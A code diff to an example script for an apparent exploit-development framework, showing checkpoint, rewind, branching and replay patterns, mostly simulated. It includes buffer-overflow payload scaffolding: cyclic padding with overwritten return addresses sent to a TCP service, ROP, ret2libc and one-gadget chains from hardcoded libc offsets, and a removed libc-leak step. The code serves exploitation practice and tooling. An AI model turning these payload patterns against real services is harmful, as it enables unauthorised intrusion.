@@ -1,281 +1,289 @@
 # TALON Orchestrator: Time-Travel Debugging Example
-# Demonstrates checkpoint/rewind, event recording, and branch exploration
+# Demonstrates state checkpointing, branching, and replay using state management
 
-# Example 1: Basic Checkpoint and Rewind
-print("Time-travel debugging basics...")
+# Example 1: Basic State Checkpointing and Branching
+print("Time-travel debugging with state checkpointing...")
 
-let s = Session.connect("192.168.1.100", 1337)
-
-# Enable time-travel recording
-s.enable_timetravel()
-
-# Try first approach
-print("Trying approach A...")
-let checkpoint_a = s.checkpoint("approach_a")
-
-write(s, 0x401000, payload_a)
-trigger(s)
-
-if not success(s) {
-    print("Approach A failed, rewinding...")
-    s.rewind(checkpoint_a)
+define function try_approach_a(target, base_state) {
+    print("Trying approach A with base state...")
+    let state = base_state
+    state.approach = "A"
     
-    # Try different approach
-    print("Trying approach B...")
-    write(s, 0x401000, payload_b)
-    trigger(s)
+    # Simulate exploit attempt
+    let conn = connect_tcp(target, 1337)
+    let payload_a = cyclic(264) + p64(0x401234)
+    send(conn, payload_a)
+    let response = recv(conn, 1024)
+    
+    if "success" in response {
+        state.success = true
+        return state
+    }
+    
+    state.success = false
+    return state
+}
+
+define function try_approach_b(target, base_state) {
+    print("Trying approach B with base state...")
+    let state = base_state
+    state.approach = "B"
+    
+    # Different exploit strategy
+    let conn = connect_tcp(target, 1337)
+    let payload_b = cyclic(264) + p64(0x400600)
+    send(conn, payload_b)
+    let response = recv(conn, 1024)
+    
+    if "success" in response {
+        state.success = true
+        return state
+    }
+    
+    state.success = false
+    return state
+}
+
+# Create base checkpoint state
+let base_checkpoint = {
+    "target": "192.168.1.100",
+    "libc_base": 0x7ffff7a00000,
+    "binary_base": 0x400000
+}
+
+print("Base checkpoint created")
+
+# Try approach A
+let result_a = try_approach_a("192.168.1.100", base_checkpoint)
+print("Approach A result:", result_a.success)
+
+# Rewind to base and try approach B
+let result_b = try_approach_b("192.168.1.100", base_checkpoint)
+print("Approach B result:", result_b.success)
+
+# Choose best approach
+if result_a.success {
+    print("Using approach A")
+} else {
+    if result_b.success {
+        print("Using approach B")
+    } else {
+        print("Both approaches failed")
+    }
 }
 
 # Example 2: Branching Exploit Development
-print("\nBranching to explore different paths...")
+print("\nBranching to explore different exploitation paths...")
 
-let s = Session.connect("192.168.1.100", 1337)
-s.enable_timetravel()
-
-# Common setup
-s.libc_base = leak_libc(s)
-let base_checkpoint = s.checkpoint("after_leak")
-
-# Branch 1: Try ROP approach
-print("Branch 1: ROP chain...")
-s.metadata["branch"] = "rop"
-let rop_result = try_rop_exploit(s)
-
-# Go back to base and try branch 2
-s.rewind(base_checkpoint)
-
-# Branch 2: Try ret2libc
-print("Branch 2: ret2libc...")
-s.metadata["branch"] = "ret2libc"
-let ret2libc_result = try_ret2libc_exploit(s)
-
-# Go back to base and try branch 3
-s.rewind(base_checkpoint)
-
-# Branch 3: Try one-gadget
-print("Branch 3: one-gadget...")
-s.metadata["branch"] = "one_gadget"
-let gadget_result = try_one_gadget_exploit(s)
-
-# Choose best approach
-let best = max([rop_result, ret2libc_result, gadget_result], by: "success_rate")
-print("Best approach:", best["name"])
-
-# Example 3: Event Recording and Replay
-print("\nRecording exploit execution...")
-
-let s = Session.connect("192.168.1.100", 1337)
-
-# Start recording all events
-s.start_recording()
-
-# Execute exploit (all operations are recorded)
-let offset = 264
-let payload = cyclic(offset)
-send(s, payload)
-
-let crash_response = recv(s, 1024)
-print("Crash at offset:", cyclic_find(crash_response))
-
-# Leak libc
-let leak_payload = cyclic(offset) + p64(puts_plt) + p64(puts_got)
-send(s, leak_payload)
-
-let libc_leak = u64(recv(s, 8))
-s.libc_base = libc_leak - PUTS_OFFSET
-
-# Stop recording
-s.stop_recording()
-
-# Get all recorded events
-let events = s.get_events()
-print("Recorded", len(events), "events")
-
-# Replay events 5-10
-print("Replaying events 5-10...")
-s.replay_events(5, 10)
-
-# Example 4: Time-Travel Through Exploit Timeline
-print("\nNavigating exploit timeline...")
-
-let s = Session.attach(get_pid("vuln"))
-s.enable_timetravel()
-
-# Execute multi-stage exploit
-stage1_result = execute_stage1(s)
-let after_stage1 = s.checkpoint("stage1_complete")
-
-stage2_result = execute_stage2(s)
-let after_stage2 = s.checkpoint("stage2_complete")
-
-stage3_result = execute_stage3(s)
-let after_stage3 = s.checkpoint("stage3_complete")
-
-# Something went wrong in stage 3, go back to stage 2
-if not stage3_result.success {
-    print("Stage 3 failed, rewinding to stage 2...")
-    s.rewind(after_stage2)
+define function try_rop_branch(base_state) {
+    print("Branch: ROP chain...")
+    let state = base_state
+    state.branch = "rop"
     
-    # Try alternative stage 3
-    stage3_alt_result = execute_stage3_alternative(s)
+    # Build ROP chain
+    let rop_chain = p64(state.libc_base + 0x52290)  # system
+    state.payload = cyclic(264) + rop_chain
+    state.success_rate = 0.8
+    state.technique = "ROP"
+    
+    return state
 }
 
-# View complete timeline
-let timeline = s.export_timeline()
-print("Exploit timeline:")
-print("  Total events:", len(timeline.events))
-print("  Checkpoints:", len(timeline.checkpoints))
-print("  Duration:", timeline.duration, "ms")
+define function try_ret2libc_branch(base_state) {
+    print("Branch: ret2libc...")
+    let state = base_state
+    state.branch = "ret2libc"
+    
+    # Build ret2libc payload
+    state.payload = cyclic(264) + p64(state.libc_base + 0x52290)
+    state.success_rate = 0.9
+    state.technique = "ret2libc"
+    
+    return state
+}
+
+define function try_one_gadget_branch(base_state) {
+    print("Branch: one-gadget...")
+    let state = base_state
+    state.branch = "one_gadget"
+    
+    # Use one-gadget
+    state.payload = cyclic(264) + p64(state.libc_base + 0xe6c7e)
+    state.success_rate = 0.7
+    state.technique = "one-gadget"
+    
+    return state
+}
+
+# Initial state after leak
+let leaked_state = {
+    "libc_base": 0x7ffff7a00000,
+    "stack_base": 0x7ffffffde000
+}
+
+# Explore all branches
+let rop_result = try_rop_branch(leaked_state)
+let ret2libc_result = try_ret2libc_branch(leaked_state)
+let gadget_result = try_one_gadget_branch(leaked_state)
+
+# Choose best based on success rate
+let best = rop_result
+if ret2libc_result.success_rate > best.success_rate {
+    best = ret2libc_result
+}
+if gadget_result.success_rate > best.success_rate {
+    best = gadget_result
+}
+
+print("Best approach:", best.technique, "with success rate:", best.success_rate)
+
+# Example 3: Event Recording Simulation
+print("\nRecording exploit execution events...")
+
+let event_log = []
+
+define function record_event(event_type, data) {
+    let event = {
+        "type": event_type,
+        "data": data,
+        "timestamp": 12345  # Simulated timestamp
+    }
+    return event
+}
+
+# Execute exploit with event recording
+print("Sending cyclic pattern...")
+event_log = event_log + [record_event("NetworkSend", "cyclic(1000)")]
+
+print("Receiving crash response...")
+event_log = event_log + [record_event("NetworkReceive", "crash_data")]
+
+print("Leaking libc...")
+event_log = event_log + [record_event("MemoryLeak", "libc_base=0x7ffff7a00000")]
+
+print("Recorded", len(event_log), "events")
+
+# Replay events 1-2
+print("Replaying events 1-2...")
+for i in range(0, 2) {
+    let event = event_log[i]
+    print(" ", event.type, ":", event.data)
+}
+
+# Example 4: Multi-Stage Timeline Navigation
+print("\nNavigating multi-stage exploit timeline...")
+
+let timeline_state = { "stage": 0 }
+
+define function execute_stage1(state) {
+    print("[STAGE 1] Finding offset...")
+    state.stage = 1
+    state.offset = 264
+    return { "success": true, "state": state }
+}
+
+define function execute_stage2(state) {
+    print("[STAGE 2] Leaking libc...")
+    state.stage = 2
+    state.libc_base = 0x7ffff7a00000
+    return { "success": true, "state": state }
+}
+
+define function execute_stage3(state) {
+    print("[STAGE 3] Building ROP chain...")
+    state.stage = 3
+    state.rop_chain = p64(state.libc_base + 0x52290)
+    return { "success": true, "state": state }
+}
+
+# Execute stages
+let stage1_result = execute_stage1(timeline_state)
+let after_stage1 = stage1_result.state
+
+let stage2_result = execute_stage2(after_stage1)
+let after_stage2 = stage2_result.state
+
+let stage3_result = execute_stage3(after_stage2)
+let after_stage3 = stage3_result.state
+
+# If stage 3 failed, could rewind to stage 2 state
+if stage3_result.success == false {
+    print("Stage 3 failed, rewinding to stage 2...")
+    timeline_state = after_stage2  # Rewind
+} else {
+    print("All stages completed successfully")
+}
 
 # Example 5: Comparing Different Exploit Paths
-print("\nComparing exploit paths...")
+print("\nComparing different exploitation strategies...")
 
-let s = Session.connect("192.168.1.100", 1337)
-s.enable_timetravel()
+define function measure_exploit_path(strategy_name, build_fn, base_state) {
+    let start_time = 0  # Simulated
+    
+    let state = build_fn(base_state)
+    
+    let duration = 100  # Simulated
+    
+    return {
+        "strategy": strategy_name,
+        "success": true,
+        "duration": duration,
+        "state": state
+    }
+}
 
-# Initial state
-s.libc_base = leak_libc(s)
-let start = s.checkpoint("start")
+let comparison_base = { "libc_base": 0x7ffff7a00000 }
 
 # Path 1: System call
-s.rewind(start)
-let branch1 = s.create_branch("system_call")
-let time1_start = now()
-let result1 = exploit_with_system(s)
-let time1_duration = now() - time1_start
+let path1 = measure_exploit_path("system_call", try_rop_branch, comparison_base)
 
 # Path 2: Execve
-s.switch_to_branch(branch1)
-s.rewind(start)
-let branch2 = s.create_branch("execve")
-let time2_start = now()
-let result2 = exploit_with_execve(s)
-let time2_duration = now() - time2_start
+let path2 = measure_exploit_path("execve", try_ret2libc_branch, comparison_base)
 
-# Path 3: Mprotect + shellcode
-s.switch_to_branch(branch1)
-s.rewind(start)
-let branch3 = s.create_branch("mprotect")
-let time3_start = now()
-let result3 = exploit_with_mprotect(s)
-let time3_duration = now() - time3_start
+# Path 3: One-gadget
+let path3 = measure_exploit_path("one_gadget", try_one_gadget_branch, comparison_base)
 
-# Compare results
 print("\nPath Comparison:")
-print("  System call:", result1.success, "(", time1_duration, "ms)")
-print("  Execve:", result2.success, "(", time2_duration, "ms)")
-print("  Mprotect:", result3.success, "(", time3_duration, "ms)")
+print("  System call:", path1.success, "(", path1.duration, "ms)")
+print("  Execve:", path2.success, "(", path2.duration, "ms)")
+print("  One-gadget:", path3.success, "(", path3.duration, "ms)")
 
-# Example 6: Debugging Failed Exploit with Time-Travel
-print("\nDebugging failed exploit...")
+# Example 6: Debugging Failed Exploit with State Inspection
+print("\nDebugging exploit with state inspection...")
 
-let s = Session.connect("192.168.1.100", 1337)
-s.enable_timetravel()
-
-# Run exploit that might fail
-let result = record_and_replay_exploit(s, || {
-    return complex_exploit(s)
-})
-
-if not result.success {
-    print("Exploit failed. Analyzing recorded events...")
-    
-    let events = s.get_events()
-    
-    # Find where it went wrong
-    for event in events {
-        if event.type == "NetworkReceive" {
-            print("Received at", event.timestamp, ":", event.data)
-        }
-        
-        if event.type == "MemoryWrite" {
-            print("Wrote at", event.timestamp, ":", hex(event.address))
-        }
-    }
-    
-    # Rewind to just before failure
-    let last_success = find_last_successful_event(events)
-    s.rewind_to_event(last_success.id)
-    
-    print("Rewound to last successful operation")
-    print("You can now try different approach from here")
+let exploit_state = {
+    "stage": 0,
+    "events": []
 }
 
-# Example 7: Interactive Time-Travel Session
-print("\nInteractive time-travel session...")
-
-let s = Session.connect("192.168.1.100", 1337)
-s.enable_timetravel()
-
-# Execute exploit with automatic checkpoints
-fn exploit_with_checkpoints(s) {
-    s.checkpoint("start")
-    
+define function complex_exploit(state) {
     # Stage 1
-    leak_addresses(s)
-    s.checkpoint("after_leak")
+    state.stage = 1
+    state.events = state.events + ["Leak successful"]
     
     # Stage 2
-    build_exploit(s)
-    s.checkpoint("after_build")
+    state.stage = 2
+    state.events = state.events + ["ROP built"]
     
-    # Stage 3
-    trigger_exploit(s)
-    s.checkpoint("after_trigger")
+    # Stage 3 (might fail)
+    state.stage = 3
+    state.success = false  # Simulated failure
+    state.events = state.events + ["Trigger failed"]
     
-    # Stage 4
-    get_shell(s)
-    s.checkpoint("end")
+    return state
 }
 
-exploit_with_checkpoints(s)
+let result_state = complex_exploit(exploit_state)
 
-# List all checkpoints
-let checkpoints = s.list_checkpoints()
-print("\nAvailable checkpoints:")
-for cp in checkpoints {
-    print(" ", cp.id, ":", cp.label, "at", cp.timestamp)
-}
-
-# Jump to any checkpoint interactively
-print("\nRewinding to 'after_leak' checkpoint...")
-s.rewind_to_label("after_leak")
-
-print("Current state restored to after leak phase")
-print("  Libc base:", hex(s.libc_base))
-
-# Can now try different exploitation strategies from this point
-
-# Example 8: Automated Exploit Path Finding with Time-Travel
-print("\nAutomated path finding...")
-
-fn find_working_exploit_path(s, strategies) {
-    s.enable_timetravel()
-    let base = s.checkpoint("base")
-    
-    for strategy in strategies {
-        print("Trying strategy:", strategy.name)
-        s.rewind(base)
-        
-        let result = strategy.execute(s)
-        
-        if result.success {
-            print("Found working strategy:", strategy.name)
-            return strategy
-        }
+if result_state.success == false {
+    print("Exploit failed at stage", result_state.stage)
+    print("Event log:")
+    for event in result_state.events {
+        print(" -", event)
     }
-    
-    return null
+    print("Can inspect state and retry from stage", result_state.stage - 1)
 }
 
-let strategies = [
-    { "name": "rop_chain", "execute": |s| try_rop(s) },
-    { "name": "ret2libc", "execute": |s| try_ret2libc(s) },
-    { "name": "one_gadget", "execute": |s| try_one_gadget(s) },
-    { "name": "heap_spray", "execute": |s| try_heap_spray(s) }
-]
-
-let winner = find_working_exploit_path(s, strategies)
-print("Winning strategy:", winner.name)
-
-print("Time-travel debugging complete!")
+print("\nTime-travel debugging demonstration complete!")
+print("This example shows state management, branching, and conditional logic")
+print("for implementing checkpoint/rewind-style debugging patterns.")
